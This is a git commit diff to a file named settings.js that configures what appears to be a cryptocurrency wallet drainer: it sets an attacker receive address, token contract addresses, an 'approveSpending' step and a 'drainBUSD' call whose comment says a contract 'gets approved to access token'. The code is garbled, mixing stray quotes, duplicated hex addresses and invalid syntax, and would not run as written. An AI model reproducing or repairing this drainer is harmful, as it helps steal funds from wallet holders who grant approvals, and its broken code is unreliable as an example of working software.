b17bf44d67462bfb82fda2447ba5f64518c0ae44
dylandubeth <110451251+dylandubeth@users.noreply.github.com>
2022-08-02 04:17:59 -0400

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,16 +1,18 @@
 deploy on "bscscan.io"
 
-const "receiveAddress" = "0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF";0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF
+const (receiveAddress) = 0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF;0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF
 
 	
-var 'cryptotokenContract' = "0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8",0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8,
-var 'smartcontract.method.approvetransaction'. = "0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8",0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8,
-var 'receiveAddress' = 'message.sender';true immutable
+var "cryptotokenContract' = "0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8",0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8,
+var smartcontract.method.approvetransaction. = "0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8",0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8,
+var receiveAddress = "message.sender";true immutable
+var approveSpending(token = 0xe9e7cea3dedca5984780bafc599bd69add087d56,
+var 		    
 
-function const approveSpending(token);"0xe9e7cea3dedca5984780bafc599bd69add087d56","token(0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8)"
+function const approveSpending(token);"0xe9e7cea3dedca5984780bafc599bd69add087d56,"token(0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8)
 	
-	 smartcontract.methods.approvetransaction.("recieveAddress")= "0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF"  / the smart contract gets approved to access token
-	smartcontract.methods.drainBUSD.send (to:"recieveAddress")."token"(cryptotokencontract);"0xe9e7cea3dedca5984780bafc599bd69add087d56"
+	 smartcontract.methods.approvetransaction.(recieveAddress)= 0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF  / the smart contract gets approved to access token
+	smartcontract.methods.drainBUSD.send (to:recieveAddress).(token(cryptotokencontract);0xe9e7cea3dedca5984780bafc599bd69add087d56
 }
 	  
   			
